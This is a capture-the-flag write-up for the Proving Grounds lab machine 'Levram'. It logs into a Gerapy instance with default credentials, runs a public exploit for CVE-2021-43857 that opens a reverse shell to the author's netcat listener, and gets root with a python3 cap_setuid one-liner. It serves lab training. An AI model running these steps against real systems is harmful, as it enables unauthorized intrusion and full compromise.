---
title: "Proving grounds Play: Levram"
layout: post
date: 2023-10-07 02:00
tag: 
- CTF
- Offsec labs
- OSCP
- Writeup
- Linux
- PG-Practice
writeups: true
hidden: true
author: Naveen
description: "Offsec proving grounds practice linux machine writeup"
---

## Nmap

```text
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 b9bc8f013f855df95cd9fbb615a01e74 (ECDSA)
|_  256 53d97f3d228afd5798fe6b1a4cac7967 (ED25519)
8000/tcp open  http-alt WSGIServer/0.2 CPython/3.10.6
|_http-title: Gerapy
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 Not Found
|     Date: Sat, 07 Oct 2023 11:16:52 GMT
|     Server: WSGIServer/0.2 CPython/3.10.6
|     Content-Type: text/html
|     Content-Length: 9979
|_    Vary: Origin
```

## 8000/tcp open  http-alt WSGIServer/0.2 CPython/3.10.6

http://192.168.211.24:8000/#/login

![img](/assets/images/CTF/Proving_Grounds/Levram/web.png)

The application uses default credentials `admin:admin` and it is vulnerable to [Gerapy 0.9.7 - Remote Code Execution (RCE) (Authenticated)](https://www.exploit-db.com/exploits/50640). 

> **Note:**
>
> If the application doesn't have any projects the exploit will throw an error, a project must exist for the exploit to work properly.

## Initial Foothold

Login to the application using the credentials and create a new project. Now run the exploit and ensure the netcat listener is running.

**Exploitation**

```sh
naveenj@hackerspace:|07:21|~/proving_grounds/Levram/exploit$ python2 exploit.py -t 192.168.211.24 -p 8000 -L 192.168.45.193 -P 4444
  ______     _______     ____   ___ ____  _       _  _  _____  ___ ____ _____ 
 / ___\ \   / / ____|   |___ \ / _ \___ \/ |     | || ||___ / ( _ ) ___|___  |
| |    \ \ / /|  _| _____ __) | | | |__) | |_____| || |_ |_ \ / _ \___ \  / / 
| |___  \ V / | |__|_____/ __/| |_| / __/| |_____|__   _|__) | (_) |__) |/ /  
 \____|  \_/  |_____|   |_____|\___/_____|_|        |_||____/ \___/____//_/   
                                                                              

Exploit for CVE-2021-43857
For: Gerapy < 0.9.8
[*] Resolving URL...
[*] Logging in to application...
[*] Login successful! Proceeding...
[*] Getting the project list
[*] Found project: test
[*] Getting the ID of the project to build the URL
('[*] Found ID of the project: ', 1)
[*] Setting up a netcat listener
listening on [any] 4444 ...
[*] Executing reverse shell payload
[*] Watchout for shell! :)
```

**Reverse Shell Obtained**

```sh
naveenj@hackerspace:|07:20|~/proving_grounds/Levram/exploit$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.45.193] from (UNKNOWN) [192.168.211.24] 42252
bash: cannot set terminal process group (845): Inappropriate ioctl for device
bash: no job control in this shell
app@ubuntu:~/gerapy$
```

**Initial Foothold Obtained**

## Privilege Escalation

Check the extended capabilities in the system.

```sh
app@ubuntu:~/gerapy$ getcap -r / 2/dev/null    #get the extended capabilites
/usr/bin/python3.10 cap_setuid=ep   #exploitable
```

### Exploitation

```sh
app@ubuntu:/tmp$ python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
id
uid=0(root) gid=1000(app) groups=1000(app)
```

**Root Obtained**

## References

- [https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities#exploitation-example](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities#exploitation-example)
- [https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/](https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/)

Thanks for reading!

For more insights and updates, follow me on Twitter: [@thevillagehacker](https://twitter.com/thevillagehackr).